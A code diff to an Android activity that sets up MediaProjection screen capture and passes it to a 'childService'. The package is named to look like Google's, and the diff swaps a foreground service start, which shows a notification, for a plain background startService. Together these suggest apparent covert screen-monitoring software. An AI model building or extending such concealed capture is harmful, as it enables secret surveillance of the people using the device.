@@ -1,20 +1,19 @@
 package com.google.cloudservices;
 
+import android.annotation.TargetApi;
+import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.media.projection.MediaProjectionManager;
+import android.os.Build;
 import android.os.Bundle;
-import android.support.v4.content.ContextCompat;
-import android.support.v7.app.AppCompatActivity;
 import android.util.DisplayMetrics;
-
-import pro.tasking.R;
 
 import java.util.Calendar;
 
-public class StartActivity extends AppCompatActivity {
+public class StartActivity extends Activity {
     private static final int REQUEST_SCREENSHOT = 59706;
     private MediaProjectionManager mgr;
     int mScreenDensity;
@@ -34,7 +33,8 @@ public class StartActivity extends AppCompatActivity {
         intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                 .putExtra(childService.EXTRA_RESULT_INTENT, data)
                 .putExtra("density", mScreenDensity);
-        ContextCompat.startForegroundService(getApplicationContext(),intent);
+        startService(intent);
+        //ContextCompat.startForegroundService(getApplicationContext(),intent);
 //            Calendar calendar = Calendar.getInstance();
 //            calendar.set(Calendar.HOUR_OF_DAY, 4);
 //            calendar.set(Calendar.MINUTE, 0);
@@ -66,6 +66,7 @@ public class StartActivity extends AppCompatActivity {
 
         }
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     public void setrquestmeediaprojection() {
         mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
 
